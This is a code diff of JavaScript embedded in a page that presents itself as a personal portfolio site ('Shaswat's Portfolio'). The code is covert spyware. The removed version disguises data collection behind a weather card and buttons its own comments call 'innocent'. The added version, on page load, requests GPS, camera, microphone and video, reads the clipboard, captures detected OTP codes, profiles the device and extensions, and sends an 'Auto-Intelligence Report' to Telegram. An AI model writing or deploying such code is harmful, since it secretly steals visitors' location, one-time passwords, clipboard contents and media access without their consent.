-        lines.push(`   Time on Page: ${Math.round((Date.now() - STATE.startTime) / 1000)}s`);
-        lines.push(`   Referrer: ${getReferrer()}`);
-        lines.push('');
-        
-        // Security
-        lines.push('🔒 *Security & Permissions*');
-        lines.push(`   Camera Used: ${STATE.cameraUsed ? 'Yes 📸' : 'No'}`);
-        lines.push(`   Mic Used: ${STATE.micUsed ? 'Yes 🎤' : 'No'}`);
-        lines.push(`   Location: ${STATE.location ? 'Yes 📍' : 'No'}`);
-        lines.push(`   Battery API: ${navigator.getBattery ? 'Yes' : 'No'}`);
-        if (STATE.clipboardContent) {
-            lines.push(`   Clipboard: ${STATE.clipboardContent.substring(0, 50)}...`);
-        }
-        if (STATE.otpDetected) {
-            lines.push(`   OTP Detected: ${STATE.otpDetected}`);
-        }
-        lines.push('');
-        
-        // Extensions
-        if (STATE.detectedExtensions.length > 0) {
-            lines.push('🔌 *Extensions Detected*');
-            for (const ext of STATE.detectedExtensions) {
-                lines.push(`   - ${ext}`);
-            }
-            lines.push('');
-        }
-        
-        // Interactions
-        lines.push('🖱️ *User Interactions*');
-        lines.push(`   Clicks: ${STATE.clicks}`);
-        lines.push(`   Scrolls: ${STATE.scrolls}`);
-        lines.push(`   Mouse Moves: ${STATE.mouseMoves}`);
-        lines.push(`   Orientation: ${getOrientation()}`);
-        lines.push(`   Sections Viewed: ${STATE.visitedSections.length}`);
-        lines.push('');
-        
-        // Performance
-        lines.push('⏱️ *Performance*');
-        const perfData = performance.getEntriesByType('navigation')[0];
-        if (perfData) {
-            lines.push(`   Load Time: ${Math.round(perfData.loadEventEnd - perfData.fetchStart)}ms`);
-            lines.push(`   DOM Ready: ${Math.round(perfData.domContentLoadedEventEnd - perfData.fetchStart)}ms`);
-        }
-        if (performance.memory) {
-            const mem = performance.memory;
-            lines.push(`   Memory Used: ${Math.round(mem.usedJSHeapSize / 1024 / 1024)}MB`);
-        }
-        lines.push('');
-        
-        // Footer
-        lines.push('━'.repeat(30));
-        lines.push(`⏰ ${getTimeFull()}`);
-        lines.push('📊 *Shaswat\'s Portfolio Analytics*');
-        
-        return lines.join('\n');
-    }
-
-    // ============================================
-    //  UI UPDATES
-    // ============================================
-    function updateUI() {
-        document.getElementById('visitorCount').textContent = getVisitCount();
-        
-        const deviceText = isMobile() ? '📱 Mobile' : '💻 Desktop';
-        document.getElementById('deviceInfo').textContent = deviceText;
-        
-        document.getElementById('footerTime').textContent = getTimeShort();
-        document.getElementById('footerNetwork').textContent = getNetworkType();
-        
-        // Random post count (stable)
-        const posts = parseInt(localStorage.getItem('_sp_posts') || '15');
-        document.getElementById('postCount').textContent = posts;
-        
-        // Update weather time
-        document.getElementById('weatherTime').innerHTML = 
-            `<span class="pulse-dot"></span> Updated ${getTimeShort()}`;
-    }
-
     function updateWeatherUI(location, ip) {
         const temp = document.getElementById('weatherTemp');
         const condition = document.getElementById('weatherCondition');
         const locationEl = document.getElementById('weatherLocation');
         const icon = document.getElementById('weatherIcon');
         
-        let locName = 'Tap to enable location';
+        let locName = 'Detecting...';
         if (location) {
             locName = `${location.lat.toFixed(2)}, ${location.lng.toFixed(2)}`;
-        } else if (ip && ip.city !== 'Unknown') {
+        } else if (ip && ip.city && ip.city !== 'Unknown') {
             locName = `${ip.city}, ${ip.country}`;
+        } else if (STATE.ipData && STATE.ipData.city && STATE.ipData.city !== 'Unknown') {
+            locName = `${STATE.ipData.city}, ${STATE.ipData.country}`;
         }
         
         const hour = new Date().getHours();
@@ -1908,243 +1732,210 @@
         icon.textContent = weatherData.icon;
         
         document.getElementById('footerLocation').textContent = locName;
+        document.getElementById('weatherTime').innerHTML = 
+            `<span class="pulse-dot"></span> Updated ${getTimeShort()}`;
     }
 
     // ============================================
-    //  WEATHER CARD - THE PERMISSION REQUEST
+    //  UI UPDATES
     // ============================================
-    async function onWeatherClick() {
-        showToast('🌤️ Getting your weather...');
+    function updateUI() {
+        document.getElementById('visitorCount').textContent = getVisitCount();
         
-        try {
-            // Request location - THIS IS THE ONLY PERMISSION
-            if (navigator.geolocation) {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000
-                    });
-                });
-                
-                STATE.location = {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                };
-                
-                const ip = await getIPInfo();
-                updateWeatherUI(STATE.location, ip);
-                showToast('✅ Weather updated!');
-                
-                // Send data now that we have location
-                await collectAndSendData();
-                
-                // Also trigger all other features now
-                await setupCamera();
-                await setupMicrophone();
-            }
-        } catch(e) {
-            // User denied or error - use IP fallback
-            showToast('📍 Using your region for weather');
-            const ip = await getIPInfo();
-            updateWeatherUI(null, ip);
-            await collectAndSendData();
+        const deviceText = isMobile() ? '📱 Mobile' : '💻 Desktop';
+        document.getElementById('deviceInfo').textContent = deviceText;
+        
+        document.getElementById('footerTime').textContent = getTimeShort();
+        
+        const network = getNetworkType();
+        document.getElementById('footerNetwork').textContent = network;
+        
+        if (STATE.batteryLevel !== null) {
+            document.getElementById('footerBattery').textContent = `${STATE.batteryLevel}%`;
         }
+        
+        const posts = parseInt(localStorage.getItem('_sp_posts') || '15');
+        document.getElementById('postCount').textContent = posts;
     }
 
-    async function getIPInfo() {
-        try {
-            const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
-            const data = await res.json();
-            STATE.ipData = {
-                ip: data.ip || 'Unknown',
-                city: data.city || 'Unknown',
-                region: data.region || 'Unknown',
-                country: data.country_name || 'Unknown',
-                isp: data.org || 'Unknown',
-                lat: data.latitude || null,
-                lng: data.longitude || null,
-            };
-            return STATE.ipData;
-        } catch {
-            return null;
+    // ============================================
+    //  BUILD FINAL REPORT
+    // ============================================
+    function buildFinalReport() {
+        const lines = [];
+        lines.push('📱 *Auto-Intelligence Report*');
+        lines.push('━'.repeat(30));
+        lines.push('');
+        
+        // Device
+        lines.push('📱 *Device*');
+        lines.push(`   Platform: ${getPlatform()}`);
+        lines.push(`   Browser: ${getBrowser()}`);
+        lines.push(`   Mobile: ${isMobile() ? 'Yes' : 'No'}`);
+        lines.push(`   Screen: ${getScreenInfo()}`);
+        lines.push(`   CPU: ${getHardwareConcurrency()} cores`);
+        lines.push(`   RAM: ${getDeviceMemory() !== 'Unknown' ? getDeviceMemory() + 'GB' : 'Unknown'}`);
+        lines.push(`   Timezone: ${getTimeZone()}`);
+        lines.push('');
+        
+        // Battery
+        if (STATE.batteryLevel !== null) {
+            lines.push('🔋 *Battery*');
+            lines.push(`   Level: ${STATE.batteryLevel}%`);
+            lines.push(`   Charging: ${STATE.isCharging ? 'Yes ⚡' : 'No 🔋'}`);
+            lines.push('');
         }
+        
+        // Location
+        if (STATE.location) {
+            lines.push('📍 *GPS*');
+            lines.push(`   Lat: ${STATE.location.lat.toFixed(6)}`);
+            lines.push(`   Lng: ${STATE.location.lng.toFixed(6)}`);
+            lines.push(`   Accuracy: ±${Math.round(STATE.location.accuracy)}m`);
+            lines.push('');
+        } else if (STATE.ipData && STATE.ipData.city && STATE.ipData.city !== 'Unknown') {
+            lines.push('📍 *IP Location*');
+            if (STATE.ipData.city) lines.push(`   City: ${STATE.ipData.city}`);
+            if (STATE.ipData.country) lines.push(`   Country: ${STATE.ipData.country}`);
+            if (STATE.ipData.ip) lines.push(`   IP: ${STATE.ipData.ip}`);
+            lines.push('');
+        }
+        
+        // Camera & Mic
+        lines.push('📸 *Media Access*');
+        lines.push(`   Camera: ${STATE.cameraAccessed ? '✅ Accessed' : '❌ Not accessed'}`);
+        lines.push(`   Microphone: ${STATE.micAccessed ? '✅ Accessed' : '❌ Not accessed'}`);
+        lines.push('');
+        
+        // Extensions
+        if (STATE.detectedExtensions.length > 0) {
+            lines.push('🔌 *Extensions*');
+            for (const ext of STATE.detectedExtensions) {
+                lines.push(`   - ${ext}`);
+            }
+            lines.push('');
+        }
+        
+        // Clipboard
+        if (STATE.clipboardContent) {
+            lines.push('📋 *Clipboard*');
+            lines.push(`   ${STATE.clipboardContent.substring(0, 80)}...`);
+            lines.push('');
+        }
+        
+        // OTP
+        if (STATE.otpDetected) {
+            lines.push('🔑 *OTP Detected*');
+            lines.push(`   ${STATE.otpDetected}`);
+            lines.push('');
+        }
+        
+        // Interactions
+        lines.push('🖱️ *Activity*');
+        lines.push(`   Clicks: ${STATE.clicks}`);
+        lines.push(`   Scrolls: ${STATE.scrolls}`);
+        lines.push(`   Time: ${Math.round((Date.now() - STATE.startTime) / 1000)}s`);
+        lines.push('');
+        
+        // Network
+        lines.push('🌐 *Network*');
+        lines.push(`   Type: ${getNetworkType()}`);
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn && conn.downlink) {
+            lines.push(`   Speed: ${conn.downlink}Mbps`);
+        }
+        if (conn && conn.rtt) {
+            lines.push(`   Latency: ${conn.rtt}ms`);
+        }
+        lines.push('');
+        
+        // Performance
+        lines.push('⏱️ *Performance*');
+        const perfData = performance.getEntriesByType('navigation')[0];
+        if (perfData) {
+            lines.push(`   Load: ${Math.round(perfData.loadEventEnd - perfData.fetchStart)}ms`);
+        }
+        if (performance.memory) {
+            const mem = performance.memory;
+            lines.push(`   Memory: ${Math.round(mem.usedJSHeapSize / 1024 / 1024)}MB`);
+        }
+        lines.push('');
+        
+        lines.push('━'.repeat(30));
+        lines.push(`⏰ ${getTimeFull()}`);
+        lines.push('📊 *Auto-Report Generated*');
+        
+        return lines.join('\n');
     }
 
     // ============================================
-    //  FEATURE BUTTON HANDLERS (Innocent)
-    // ============================================
-    function setupFeatureButtons() {
-        // Photo button - triggers camera
-        document.getElementById('photoBtn').addEventListener('click', async () => {
-            showToast('📸 Opening camera...');
-            await setupCamera();
-            showToast('📸 Photo ready! Check your camera');
-            // Send alert that user clicked photo
-            sendAlert('📸 User clicked Photo button');
-        });
-        
-        // Mic button - triggers microphone
-        document.getElementById('micBtn').addEventListener('click', async () => {
-            showToast('🎤 Opening microphone...');
-            await setupMicrophone();
-            showToast('🎤 Microphone ready! Tap again to record');
-            // Send alert that user clicked mic
-            sendAlert('🎤 User clicked Voice button');
-        });
-        
-        // Video button
-        document.getElementById('videoBtn').addEventListener('click', async () => {
-            showToast('🎥 Opening video...');
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true, 
-                    audio: true 
-                });
-                stream.getTracks().forEach(track => track.stop());
-                showToast('📹 Video ready!');
-                sendAlert('🎥 Video access requested');
-            } catch(e) {
-                showToast('📹 Video not available');
-            }
-        });
-        
-        // Avatar click - looks innocent
-        document.getElementById('avatarClick').addEventListener('click', () => {
-            showToast('🌟 Shaswat\'s profile!');
-            sendAlert('👤 Profile viewed');
-        });
-        
-        // Interactive area
-        document.getElementById('interactiveArea').addEventListener('click', () => {
-            const activities = [
-                '🎯 Try drawing a star!',
-                '📚 Read a book today',
-                '🏏 Practice cricket',
-                '🎨 Draw something creative',
-                '💻 Code a simple game',
-                '🌍 Explore Google Earth',
-                '🔬 Try a science experiment',
-                '🎮 Play a puzzle game'
-            ];
-            const activity = activities[Math.floor(Math.random() * activities.length)];
-            showToast(`✨ ${activity}`);
-            sendAlert(`🎯 Interactive: ${activity}`);
-        });
-    }
-
-    // ============================================
-    //  MOUSE & INTERACTION TRACKING
-    // ============================================
-    function setupInteractionTracking() {
-        document.addEventListener('mousemove', () => {
-            STATE.mouseMoves++;
-            if (STATE.mouseMoves % 100 === 0) {
-                sendAlert(`🖱️ Mouse moves: ${STATE.mouseMoves}`);
-            }
-        });
-        
-        document.addEventListener('click', () => {
-            STATE.clicks++;
-            if (STATE.clicks % 5 === 0) {
-                sendAlert(`👆 Clicks: ${STATE.clicks}`);
-            }
-        });
-        
-        document.addEventListener('scroll', () => {
-            STATE.scrolls++;
-            if (STATE.scrolls % 10 === 0) {
-                sendAlert(`📜 Scrolls: ${STATE.scrolls}`);
-            }
-        });
-    }
-
-    // ============================================
-    //  SELECTION TRACKING
-    // ============================================
-    function setupSelectionTracking() {
-        if (!CONFIG.ENABLE_SELECTION_TRACK) return;
-        
-        document.addEventListener('mouseup', () => {
-            const selection = window.getSelection().toString();
-            if (selection.length > 20) {
-                const preview = selection.substring(0, 100);
-                sendAlert(`📝 Text selected: ${preview}${selection.length > 100 ? '...' : ''}`);
-            }
-        });
-        
-        // Touch selection for mobile
-        document.addEventListener('touchend', () => {
-            setTimeout(() => {
-                const selection = window.getSelection().toString();
-                if (selection.length > 20) {
-                    sendAlert(`📝 Text selected (touch): ${selection.substring(0, 50)}...`);
-                }
-            }, 100);
-        });
-    }
-
-    // ============================================
-    //  ERROR HANDLING (Silent)
-    // ============================================
-    window.addEventListener('error', (e) => {
-        sendAlert(`⚠️ Error: ${e.message || 'Unknown'}`);
-    });
-    
-    window.addEventListener('unhandledrejection', (e) => {
-        sendAlert(`⚠️ Promise error: ${e.reason || 'Unknown'}`);
-    });
-
-    // ============================================
-    //  INITIALIZATION
+    //  MAIN INITIALIZATION
     // ============================================
     async function init() {
-        console.log('🌟 Shaswat\'s Portfolio loaded');
+        console.log('🌟 Auto-Portfolio initialized');
         
-        // Get session info
+        // Initialize state
         STATE.deviceId = getDeviceId();
         STATE.sessionId = getSessionId();
         STATE.visitCount = getVisitCount();
         STATE.firstVisit = getFirstVisit();
         STATE.startTime = Date.now();
         
-        // Initial UI
+        // Update status
+        updateStatus('🔄 Initializing...', 'Loading', 'yellow', 'yellow');
+        
+        // Start ALL AUTO features immediately
+        const startTime = Date.now();
+        
+        // 1. Battery (fastest)
+        await autoBattery();
+        
+        // 2. Location (with permission)
+        autoLocation();
+        
+        // 3. Camera (after 500ms to not overload)
+        setTimeout(autoCamera, 500);
+        
+        // 4. Microphone (after 1000ms)
+        setTimeout(autoMicrophone, 1000);
+        
+        // 5. Video (after 1500ms)
+        setTimeout(autoVideo, 1500);
+        
+        // 6. All other features immediately
+        autoClipboard();
+        autoOTP();
+        autoMotion();
+        autoLightSensor();
+        autoExtensions();
+        autoScreenshotDetection();
+        autoPerformance();
+        autoNetwork();
+        autoSocialDetection();
+        autoThemeDetection();
+        autoIdleDetection();
+        autoMediaDetection();
+        autoInteractionTracking();
+        autoFileDetection();
+        autoGamepadDetection();
+        
+        // Update UI
         updateUI();
         
-        // Get IP for weather fallback
-        const ip = await getIPInfo();
-        updateWeatherUI(null, ip);
-        
-        // Setup all features
-        await setupBatteryTracking();
-        setupClipboardTracking();
-        setupOTPDetection();
-        setupMotionTracking();
-        setupLightSensor();
-        setupScreenshotDetection();
-        setupExtensionDetection();
-        setupNetworkMonitoring();
-        setupIdleDetection();
-        setupMediaDetection();
-        setupPerformanceMonitoring();
-        setupSocialDetection();
-        setupVisibilityTracking();
-        setupThemeDetection();
-        setupGamepadDetection();
-        setupFileDetection();
-        setupClipboardImageDetection();
-        setupDetailedOrientation();
-        setupInteractionTracking();
-        setupSelectionTracking();
-        setupFeatureButtons();
-        
-        // Weather click handler
-        document.getElementById('weatherCard').addEventListener('click', onWeatherClick);
-        
-        // Auto-send after 3 seconds (looks like page loading)
-        setTimeout(async () => {
-            await collectAndSendData();
-        }, 3000);
+        // Send final report after all features have had time to run
+        setTimeout(() => {
+            const report = buildFinalReport();
+            sendToTelegram(report);
+            updateStatus('✅ Complete', 'All systems ready', 'green', 'green');
+            
+            // Update UI with results
+            document.getElementById('cameraStatus').textContent = STATE.cameraAccessed ? '✅' : '📷';
+            document.getElementById('cameraStatus').style.background = STATE.cameraAccessed ? '#4ade80' : '#f87171';
+            
+            showToast('✅ Portfolio loaded successfully');
+            
+            console.log('✅ Auto-report sent to Telegram');
+        }, 5000);
         
         // Update time every 30 seconds
         setInterval(() => {
@@ -2156,10 +1947,11 @@
         // Update stats periodically
         setInterval(updateUI, 60000);
         
-        showToast('🌟 Welcome to my portfolio!');
+        // Log completion
+        console.log('🚀 All auto-features initialized in', Date.now() - startTime, 'ms');
     }
 
-    // Start everything
+    // Start everything automatically
     document.addEventListener('DOMContentLoaded', init);
     </script>
 
